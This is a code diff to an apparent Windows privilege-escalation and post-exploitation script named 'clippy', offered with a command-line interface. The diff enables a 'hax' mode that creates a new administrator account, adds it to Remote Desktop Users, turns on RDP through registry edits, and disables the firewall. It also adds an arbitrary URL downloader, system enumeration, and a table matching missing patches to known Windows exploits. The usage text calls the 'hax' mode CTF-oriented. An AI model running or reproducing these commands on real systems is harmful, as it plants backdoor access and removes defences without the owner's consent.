@@ -1,17 +1,10 @@
-import subprocess
-import urllib
-import random
-import datetime
-import re
+import subprocess,urllib.request,random,sys,datetime,re,os
 from pathlib import Path
-import os
 
 report = ""
 
 def print_banner(title):
-	banner = "==============================\n"
-	banner += title
-	banner += "\n==============================\n"
+	banner = "==============================\n" + title + "\n==============================\n"
 	global report
 	report += banner
 	print(banner)
@@ -34,13 +27,13 @@ def list_dir(path):
 	global report
 	report += "\n" + dir_string
 
-def determine_os_ver(ver_string):
-	ver_string.splitlines()[1]
-	#stub
+def determine_os_ver(): # STUB
+	#ver_string.splitlines()[1]
+	return "Not yet Implemented"
 
 def kb_search(kbs):
-	print_banner("OS Ver Possible Exploits")
-	os = "notimplementedyet"
+	print_banner("OS Ver Possible Exploits (Not yet implemented)")
+	os = determine_os_ver()
 	vulns = [ 
 		["MS04-019",["2000 SP3","2000 SP4"],"KB842526"],
 		["MS04-011",["2000 SP2","2000 SP3","2000 SP4","XP","XP SP1"],"KB835732"],
@@ -67,47 +60,43 @@ def kb_search(kbs):
 		["MS15-076",["2003 SP2","Vista SP2","2008 SP2","7","7 SP1", "8","8.1","2012"],"KB3067505"],
 		["MS16-016",["2008 SP1","2008 SP2","Vista SP2","7 SP1"],"KB3136041"],
 		["MS16-032",["2008 SP1","2008 SP2","Vista SP2","7 SP1"],"KB3143141"],
-		["MS17-017",["2008 SP2","Vista SP2","7 SP1"],"KB4013081"],
-	]
-		#["MS14-058",[],"KB3000061"],
-		#["MS15-010",["XP","2003","2008","7"],"KB3036220"],
-		#["MS15-061",["2003","2008","7","2012","8"],"KB3057839"],
-		#["MS15-075",["2003","2008","7","2012","8"],"KB3164038"],
-		## ["MS16-051",["2003","2008","7","8","2012"],"KB3057191"],
+		["MS17-017",["2008 SP2","Vista SP2","7 SP1"],"KB4013081"]]
+		#["MS14-058",[],"KB3000061"], #["MS15-010",["XP","2003","2008","7"],"KB3036220"],#["MS15-061",["2003","2008","7","2012","8"],"KB3057839"],#["MS15-075",["2003","2008","7","2012","8"],"KB3164038"],## ["MS16-051",["2003","2008","7","8","2012"],"KB3057191"],
 	compat = []
-
 	for vuln in vulns:
 		if os in vuln[1] and vuln[2] not in kbs:
 			compat.append(vuln)
 	for vuln in compat:
 		print(vuln[0])
 
-greetings = [
-"escalate privileges",
-"hack the planet"
-]
+def save_report():
+	text_file = open("clippy_report_" + str(datetime.datetime.now()).replace(":","_").replace(" ","_").replace(".","_") + ".txt", "w")
+	text_file.write(report)
+	text_file.close()
 
-greeting = "I see you're trying to " + random.choice(greetings) + ", would you like some help with that?"
-printstr = """\
+def greeting():
+	greetings = ["escalate privileges","hack the planet"]
+	greeting = "I see you're trying to " + random.choice(greetings) + ", would you like some help with that?"
+	print("""\
+	< {0} >
+		     __
+		    /  \
+		    |  |
+		    @  @
+		    |  |
+		    || |/
+		    || ||
+		    |\_/|
+		    \___/
+	                    """.format(greeting)) #Source https://textart.io/cowsay/clippy
 
-< {0} >
-	     __
-	    /  \
-	    |  |
-	    @  @
-	    |  |
-	    || |/
-	    || ||
-	    |\_/|
-	    \___/
-                    """.format(greeting)
-
-print(printstr) #Source https://textart.io/cowsay/clippy
+def usage():
+	print("Usage: clippy.exe\nclippy.exe enum            - Performs  enumeration\nclippy.exe enum report     - Performs enumeration and saves report to disk\nclippy.exe download [url]  - Downloads a file from given URL \nclippy.exe hax             - Creates new admin, enables RDP, disables firewall (CTF Orientated)")
 
 def enum():
 	print_banner("BASIC OS INFO")
 	system_call('ver')
-	determine_os_ver(system_call('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'))
+	system_call('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"')
 	system_call('hostname')
 	system_call('net config Workstation')
 
@@ -181,26 +170,34 @@ def enum():
 		print("accesschk.exe missing.")
 
 def download(url):
-	file = urllib2.urlopen(url)
-	filename = url[url.rindex('/')+1:]
-	with open('filename','wb') as output:
+	file = urllib.request.urlopen(url)
+	with open(url[url.rindex('/')+1:],'wb') as output:
   		output.write(file.read())
 
 def obvious_hax():
 	print_banner("Creating a new admin user")
-	# system_call("net user hacker hacker /add")
-	# system_call("net localgroup administrators hacker /add")
-	# system_call('net localgroup "Remote Desktop Users" hacker /add')
-	# print_banner("Enabling RDP")
-	# system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f')
-	# system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
-	# system_call('net start TermService')
-	# print_banner("Disabling Firewall")
-	# system_call('NetSh Advfirewall set allprofiles state off')
-	# system_call('netsh firewall set opmode disable')
+	system_call("net user hax hax /add")
+	system_call("net localgroup administrators hax /add")
+	system_call('net localgroup "Remote Desktop Users" hax /add')
+	print_banner("Enabling RDP")
+	system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f')
+	system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
+	system_call('net start TermService')
+	print_banner("Disabling Firewall")
+	system_call('NetSh Advfirewall set allprofiles state off')
+	system_call('netsh firewall set opmode disable')
 
-enum()
-time = str(datetime.datetime.now()).replace(":","_").replace(" ","_").replace(".","_")
-text_file = open("clippy_report_" + time + ".txt", "w")
-text_file.write(report)
-text_file.close()
+greeting()
+if len(sys.argv) > 1:
+	if "enum" in sys.argv:
+		enum()
+		if "report" in sys.argv:
+			save_report()
+	elif "hax" in sys.argv:
+		obvious_hax()
+	elif "download" in sys.argv and len(sys.argv) > 2:
+		download(sys.argv[2])
+	else: 
+		usage()
+else:
+		usage()
